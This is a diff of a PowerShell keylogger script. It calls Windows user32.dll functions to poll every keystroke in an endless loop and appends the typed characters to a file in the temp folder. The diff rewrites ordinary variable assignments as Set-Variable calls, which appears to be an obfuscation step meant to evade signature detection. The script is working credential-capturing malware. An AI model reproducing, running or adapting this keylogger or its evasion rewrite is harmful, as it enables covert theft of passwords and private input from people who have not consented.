@@ -1,23 +1,23 @@
 #requires -Version 2
-function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
+function Start-KeyLogger($Path="$env:temp\keylogger.txt")
 {
   # Signatures for API Calls
-  $signatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
+  Set-Variable -Name signatures -Value (@'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
+public static extern short GetAsyncKeyState(int virtualKeyCode);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int GetKeyboardState(byte[] keystate);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-'@
+'@)
 
   # load signatures and make members available
-  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-    
+  Set-Variable -Name API -Value (Add-Type -MemberDefinition $signatures -PassThru -Name 'Win32' -Namespace API)
+
   # create output file
-  $null = New-Item -Path $Path -ItemType File -Force
+  Set-Variable -Name null -Value (New-Item -Path $Path -ItemType File -Force)
 
   try
   {
@@ -27,11 +27,11 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     # executes and shows the collected key presses
     while ($true) {
       Start-Sleep -Milliseconds 40
-      
+
       # scan all ASCII codes above 8
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
+      for (Set-Variable -Name ascii -Value (9); $ascii -le 254; $ascii++) {
         # get current key state
-        $state = $API::GetAsyncKeyState($ascii)
+        Set-Variable -Name state -Value ($API::GetAsyncKeyState($ascii))
 
         # is key pressed?
         if ($state -eq -32767) {
@@ -50,10 +50,10 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           # translate virtual key
           $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
-          if ($success) 
+          if ($success)
           {
             # add key to logger file
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
           }
         }
       }
